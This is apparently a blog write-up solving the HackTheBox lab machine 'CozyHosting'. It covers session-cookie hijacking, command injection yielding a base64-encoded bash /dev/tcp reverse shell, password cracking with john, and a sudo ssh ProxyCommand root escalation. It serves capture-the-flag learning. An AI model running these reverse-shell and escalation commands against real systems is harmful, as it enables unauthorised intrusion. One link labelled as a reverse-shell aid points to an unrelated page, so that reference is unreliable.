---
layout: post
title: "HTB: CozyHosting"
---

# Introduction

CozyHosting is an easy Linux box on HackTheBox, and is based on cookie abuse and command injection.

![pwn](/docs/assets/img/HTB-CozyHosting/pwn.PNG)

# Recon

## nmap

```powershell
nmap -sV -sC -Pn -p- --min-rate=1000 10.129.110.116
```

![nmap](/docs/assets/img/HTB-CozyHosting/1_nmap.PNG)

We found 2 open ports, the usual combo of ssh port 22 and web on port 80. We cant access website quite yet, it throws error at us, so let’s add the ip to **/etc/hosts** and try to access again.

![hosts](/docs/assets/img/HTB-CozyHosting/2_hosts.PNG)

## Site Exploration

![web](/docs/assets/img/HTB-CozyHosting/3_web.PNG)

There is nothing interesting on this page apart from the login button. So let’s try to fuzz the directories enabled on this site.

```powershell
dirsearch -u http://cozyhosting.htb/
```

![dirbust](/docs/assets/img/HTB-CozyHosting/4_dirbust.PNG)

We found few interesting things, **/admin** unfortunately redirects back to login but there are more interesting options under **/actuator**.

In the **/actuator/sessions** we can see session cookies of previous logins, one with its username.

![sessions](/docs/assets/img/HTB-CozyHosting/4_sessions.PNG)

# Log-in

Using `burp` we can capture out login attempt and switch the `JSESSIONID` for the one we found earlier. _Be careful, the session ID is on a timer so you may need to refresh before use_

![burp](/docs/assets/img/HTB-CozyHosting/05_burp.PNG)

With that we are in!

![login](/docs/assets/img/HTB-CozyHosting/06_cookie_login.PNG)

On the bottom of a page there is a form that serves as a ssh connection. Using `burp` we can intercept the request again and change the values to anything we want.

![nc](/docs/assets/img/HTB-CozyHosting/07_nc2.PNG)

# Reverse Shell

There are many way to get the reverse shell now.

Try [THIS](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) useful website.

```powershell
echo "bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1" | base64 -w 0
echo "{PAYLOAD}"|base64 -d|bash
```

![shell](/docs/assets/img/HTB-CozyHosting/shell.PNG)

Just dont forget to **URL-encode** whatever you choose (Ctrl+U)

Start `nc` listener

```powershell
nc -lvnp 4444
```

and send the request.

![nc2](/docs/assets/img/HTB-CozyHosting/07_nc3.PNG)

Now make the shell stable.

```powershell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl + z
stty raw -echo; fg
```

# Exploration

There is **.jar** file we can use. Run a python server

```powershell
python3 -m http.server 4444
```

and download it to your machine.

```powershell
wget http://10.129.110.116:4444/cloudhosting-0.0.1.jar
```

Now open it using `jd-gui` and see what we got.

![jd-gui1](/docs/assets/img/HTB-CozyHosting/jd-gui.PNG)

![jd-gui2](/docs/assets/img/HTB-CozyHosting/jd-gui2.PNG)

With the password we found inside we can log into the database.

```powershell
psql -h 127.0.0.1 -U postgres
```

![database](/docs/assets/img/HTB-CozyHosting/database.PNG)

When we select all users we can see hashed password for admin account.

## John

Now we can use `john` to crack the password

```powershell
john password_hash.txt --wordlist=rockyou.txt
```

![josh_password](/docs/assets/img/HTB-CozyHosting/josh_password.PNG)

With the newly found password and the username we got from **/etc/passwd**

![users](/docs/assets/img/HTB-CozyHosting/users.PNG)

we can use the ssh port we found in the beginning.

## SSH in ...

![ssh_in](/docs/assets/img/HTB-CozyHosting/ssh_in.PNG)

… and grab the flag!

![user_flag](/docs/assets/img/HTB-CozyHosting/user_flag.PNG)

# Privilege Escalation

We can use `sudo -l` to list the allowed commands for the user. 

Here we found that our user can may run the `(root) /usr/bin/ssh *` command on localhost, which will give us root privileges.

![sudo_l](/docs/assets/img/HTB-CozyHosting/sudo_l.PNG)

Just check out [GTFOBINS](https://gtfobins.github.io/gtfobins/ssh/#sudo) for the command.

```powershell
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![root](/docs/assets/img/HTB-CozyHosting/root.PNG)

and it is done!

Now grab the flag and have a nice day!

![root_flag](/docs/assets/img/HTB-CozyHosting/root_flag.PNG)

~